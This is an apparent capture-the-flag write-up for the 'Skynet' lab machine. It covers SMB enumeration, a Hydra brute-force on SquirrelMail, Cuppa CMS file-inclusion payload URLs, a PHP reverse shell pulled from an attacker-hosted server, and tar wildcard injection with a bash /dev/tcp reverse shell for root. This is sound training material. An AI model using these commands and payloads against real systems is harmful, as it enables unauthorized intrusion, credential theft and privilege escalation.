# Skynet

##### Difficulty: [ Easy ]

**Tags:** `Linux`,  `nmap`,  `enum4linux`,  `hydra`,  `squirrelmail`,  `smb`,  `Cuppa CMS`,  `RFI`,  `reverse shell`,  `cronjob`,  `tar`

---

##### Written: 17/09/2021

##### IP Address: 10.10.86.116

---

### [ What is Miles password for his emails? ]

Let's start off by enumerating the services that are running on our target machine. We can do this with **nmap**.

```
sudo nmap -sC -sV -vv -oN nmap_initial 10.10.86.116
```

Results:

<img style="float: left;" src="screenshots/screenshot1.png">

As we can see, there are **6** ports open on our target.

* 22 - SSH Server
* 80 - HTTP Server
* 110 - pop3 (email)
* 139 - Samba
* 143 - imap (email)
* 445 - Samba

<br>

Let's start by first enumerating the Samba service. We can do so using a nifty tool called **enum4linux**. The command is as follows:

```
enum4linux 10.10.86.116
```

Results:

<img style="float: left;" src="screenshots/screenshot2.png">

From the results, we can find out two important pieces of information. Firstly, there is a user called **milesdyson** with his personal share. We will take note of this for now, but we cannot do anything until we have acquired milesdyson's password. 

There is also an **anonymous** share which allows for anonymous login. This is great as we will be able to access this share without needing to supply a password! To access the share, we can use **smbclient**.

```
smbclient //10.10.86.116/anonymous -U anonymous
```

<img style="float: left;" src="screenshots/screenshot3.png">

There is a text file called **attention.txt**, as well as a directory called **logs**, with three text files: **log1.txt**, **log2.txt**, **log3.txt**.

I downloaded all of these files to my local machine using the ```get``` command.

<br>

**Attention.txt**

<img style="float: left;" src="screenshots/screenshot4.png">

The emphasis on passwords makes me believe that I will have to try a dictionary or brute-force attack later on.

**log1.txt**

<img style="float: left;" src="screenshots/screenshot5.png">

Sure enough, **log1.txt** looks like a wordlist of some sorts. log2.txt and log3.txt were empty files and did not contain anything useful.

<br>

I tried using **Hydra** with the username: **milesdyson** and **log1.txt** as the password wordlist with **SSH** and **Samba**. However, both failed to find any passwords. Let's go ahead and visit the **HTTP** server now.

<br>

Visiting the web server, we are greeted with the following page:

<img style="float: left;" src="screenshots/screenshot6.png">

Before carrying on with our own manual enumeration, let's run a **Gobuster** scan to try and find any hidden directories on this web server. We will be using Dirbuster's directory medium wordlist. We also make sure to check for common extensions such as **.php** and **.txt** during our enumeration. 

```
gobuster dir -u http://10.10.86.116/ -x php,html,txt -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100
```

*(Note that -t 100 helps to speed up the scan by increasing the number of threads)*

<br>

While the scan is chugging along, we can do some happy path enumeration. Searching for anything in the **'Skynet Search'** bar simply directs us back to the homepage. The same thing happens when we press the **'I'm Feeling Lucky'** button. The source code also reveals nothing of interest. Seems like there is nothing much on the main page. Let's look back at our Gobuster scan!

<img style="float: left;" src="screenshots/screenshot7.png">

There are a few directories of interest:

* /admin
* /config
* /ai

Unfortunately, we are unable to access any of these directories as we do not have permissions:

<img style="float: left;" src="screenshots/screenshot8.png">

---

*From here, I basically went down a rabbit hole of trying to use Hydra on the various email services that were enumerated from our nmap scan - POP3 and IMAP. This is because the first prompt in the room asked to find the password of Miles's email account. Hence, I was trying to access these email services directly through the command line, which was not working. In the end, I realized that while I had thought that my Gobuster scan was already completed, it was still finding hidden directories, one of which was **squirrelmail**. Hence, a lesson learnt is to be patient and understand that sometimes these scans can take a long time to bear fruit, especially with large wordlists.*

---

<img style="float: left;" src="screenshots/screenshot9.png">

After waiting for some more time, Gobuster managed to enumerate a **/squirrelmail** directory. Visiting the directory brings us to this login page:

<img style="float: left;" src="screenshots/screenshot10.png">



Nice! We can now try to use **Hydra** to run a dictionary attack on this login form. Before we do so, we first need to obtain some key pieces of information which we need to feed into Hydra. Let's input some random credentials and try logging in. We can use Firefox's **network inspector** to look at the login request (**CTRL-SHIFT-I > Network**).

**Login request:**

<img style="float: left;" src="screenshots/screenshot11.png">

<br>

Here, we can see that when a user logs into squirrelmail, a **POST** request is made. Hence, we will have to use the **http-post-form** option for Hydra later on. We also see that the request is directed to **/squirrelmail/src/redirect.php**.

<img style="float: left;" src="screenshots/screenshot12.png">

From the form data of the request, we can also see that there are four parameters that are sent: **login_username**, **secretkey**, **js_autodetect_results** and **just_logged_in**.

<img style="float: left;" src="screenshots/screenshot13.png">

Finally, we have the error message that is returned to us when we try to login with incorrect credentials: **"Unknown user or password incorrect."**. This is important as Hydra will check for this message in the response to determine whether the password attempt was successful or not.

<br>

We now have all the pieces of information in order to craft our Hydra command. We will be using the username '**milesdyson**' as that seems to be the most likely username as of now.

```
hydra -l milesdyson -P log1.txt 10.10.86.116 http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:Unknown user or password incorrect" -V
```

<img style="float: left;" src="screenshots/screenshot14.png">

Nice! We managed to obtain Mile's password: **cyborg007haloterminator**

---

### [ What is the hidden directory? ]

With Mile's email credentials, let's go ahead and log into his squirrelmail mailbox.

His mailbox contains three emails, with two of them containing information that we do not need. However, the first email titled **'Samba Password reset'** actually contains the password to Mile's Samba share!

<img style="float: left;" src="screenshots/screenshot15.png">

With this password, let's access his share and see what we can find. We can use **smbclient** once again to do so, this time specifying to log in as the user **milesdyson**.

<br>

<img style="float: left;" src="screenshots/screenshot16.png">

There are a bunch of pdf files which contains complex information about artificial intelligence and neural networks. Let's skip those and go straight to the **notes** directory:

<img style="float: left;" src="screenshots/screenshot17.png">

Once again, more files that look very academic in nature. If we look carefully, we can actually find an **important.txt** file. Let's download this file to our local machine using the ```get``` command.

**Contents of important.txt:**

<img style="float: left;" src="screenshots/screenshot18.png">

And we have the hidden directory: **/45kra24zxs28v3yd**

---

### [ What is the vulnerability called when you can include a remote file for malicious purposes? ]

Vulnerability: **Remote File Inclusion**

---

### [ What is the user flag? ]

Let's visit this hidden directory:

<img style="float: left;" src="screenshots/screenshot19.png">

Doing some manual enumeration, we are unable to find any useful information or entry points into our target machine. With that, let's run a **Gobuster** scan on this directory! Once again, we'll be using Dirbuster's medium word list.

```
ghobuster dir -u http://10.10.181.238/45kra24zxs28v3yd/ -x php -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100
```

**Results of scan:**

<img style="float: left;" src="screenshots/screenshot20.png">

We managed to find an **administrator** directory. Let's take a look:

<img style="float: left;" src="screenshots/screenshot21.png">

Looks like a login page to a **Cuppa CMS** service. We first try Mile's credentials for his email and his samba to login, but unfortunately those do not work. From my experiences with earlier CTFs, I recall exploits existing for this Cuppa CMS service. We can find such exploits using **Searchsploit**. The command to do so is as follow:

``` 
searchsploit cuppa
```

<img style="float: left;" src="screenshots/screenshot22.png">

Turns out there is an exploit for Cuppa CMS, one that uses **remote file inclusion** too. This is probably the exploit we have to use, considering that remote file inclusion was mentioned earlier in the room. We can download this exploit using the **-m** tag:

``` 
searchsploit -m php/webapps/25971.txt
```

<br>

<img style="float: left;" src="screenshots/screenshot23.png">

In essence, this exploit targets the **alertConfigField.php** file within the Cuppa CMS service. More specifically, it targets the **urlConfig** parameter. Through this parameter, we can input a path that traverses directories to access other files on the machine, such as /etc/passwd. This is known as a **local file inclusion attack**. However, we can also input a path to a file on a web server that we, the attacker, are hosting. This will cause our target machine to download and execute that file, allowing us to do things such as open up a reverse shell! This is known as a **remote file inclusion attack**. We will be using such an attack to open up a reverse shell and gain access.

Before we do that, let's just try to read the **/etc/passwd** file on our target machine, so as to verify that the inclusion attacks even work.

<br>

**Payload:**

 http://10.10.181.238/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd

**Results:**

<img style="float: left;" src="screenshots/screenshot24.png">

Great! :smile: Looks like we can indeed execute inclusion attacks on this machine. Now, we will move on to carrying out the remote file inclusion attack.

We'll be using the **php reverse shell** created by **Pentestmonkey**: https://github.com/pentestmonkey/php-reverse-shell.

Next, we host a simple HTTP server using Python. The command to do so is:

```
python3 -m http.server
```

Of course, we need to set up a **netcat listener** so that it can catch the reverse shell when it is opened. With the server up and running, we just have to provide the following path to the target web server:

http://10.10.181.238/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://x.x.x.x:8000/php-reverse-shell.php

**x.x.x.x** is the tun0 ip address of my local machine and the Python HTTP server is being run on port **8000**. Once we visit this URL, we can see that the reverse shell has been successfully opened:

<img style="float: left;" src="screenshots/screenshot25.png">

We're in! :smiling_imp:

<br>

<img style="float: left;" src="screenshots/screenshot26.png">

From here, we can simply access miledyson's home directory and obtain **user.txt**.

---

### [ What is the root flag? ]

There is an interesting directory in milesdyson's home directory, called **backups**. Looking inside, there is a **backup.sh** shell script and a TGZ file called **backup.tgz**.

<img style="float: left;" src="screenshots/screenshot27.png">

What's interesting to note is that both of these files are owned by **root**. 

<br>

**Contents of backup.sh:**

<img style="float: left;" src="screenshots/screenshot28.png">

What **backup.sh** does is to first traverse to the **/var/www/html** directory, before archiving all of the files inside using the ```tar``` command. What's especially interesting to me is the use of the wildcard operator (*****).

<img style="float: left;" src="screenshots/screenshot29.png">

Looking at **GTFOBins**, we can see that we can actually exploit **tar** to spawn a privileged shell. In our case, we need to add in the following tags to the tar command to do so:

* --checkpoint=1
* --checkpoint-action=exec=/bin/sh

As mentioned earlier, the wildcard operator (*) actually allows us to add those tags even though we do not have direct write permissions to the **backup.sh** file. This type of attack is called a **wildcard injection attack**: 

https://materials.rangeforce.com/tutorial/2019/11/08/Linux-PrivEsc-Wildcard/

---

**Explanation of Wildcard Injection Attack**

Assume we have a directory with the following files: **a.txt**, **b.txt**, **c.txt**.

If we do a ```rm *```, we will delete all of the files within the directory. However, what is actually happening is that the *****  is being expanded to list all of the files. Hence, the actual command being run is ```rm a.txt b.txt c.txt```. 

Hence, if we have a file called **-rf**, the actual command being run will be ```rm -rf a.txt b.txt c.txt```. The **-rf** filename will actually end up being interpreted as a command-line argument! 

With the correct program, this attack can be used to escalate privileges.

---

To execute this attack, we need to create two files: **--checkpoint=1** and **--checkpoint-action=exec=bash\ shell.sh** in the **/var/www/html** directory. Before that, let's first create a bash script that spawns a shell. This bash script will be called **shell.sh** and will be also be in /var/www/html.

```
echo $'#!/bin/bash\nbash -i >& /dev/tcp/YOUR_IP_HERE/4444 0>&1' > shell.sh
```

We use echo to write the script as **vim** and **nano** were unfortunately not cooperating with the terminal.

<br>

With the shell script created, let's go ahead and create the two files that will act as command-line arguments to the tar program.

```
touch -- --checkpoint=1
touch -- --checkpoint-action=exec=bash\ shell.sh
```

The action to execute at the checkpoint would be to run **shell.sh** using bash. The **\\** symbol is so that we can properly escape the **space** between 'bash' and 'shell.sh'.

Also, as we cannot directly create files with '-' characters in the name, we have to input a '--' before '--checkpoint...'. In bash, '--' often means the end of options. Thus, our subsequent '-' characters will not be parsed as an option and can be used in the file name.

**How /var/www/html looks like:**

<img style="float: left;" src="screenshots/screenshot31.png">

<br>

With everything set up, we just have to figure out how to run **backup.sh** as **root**, which will in turn run the tar program with our command-line arguments. My initial guess was that backup.sh was being run as a **cronjob** by root, which makes sense as it is a backup program after all.

To verify this, we can use **pspy**, a nifty tool that allows us to snoop on processes running on the machine without having root permissions. (https://github.com/DominicBreuker/pspy)

After downloading the pspy32 executable onto the machine and running it, we can see the following results:

<img style="float: left;" src="screenshots/screenshot30.png">

Thus, backup.sh is indeed a cronjob, as it is automatically run every minute. The process is also run with UID=0, which belongs to root!

<br>

 Sure enough, after one minute had passed, our reverse shell was opened and we gained access into the machine as root.

<img style="float: left;" src="screenshots/screenshot32.png">

**With that, we could obtain root.txt and finish the room.**

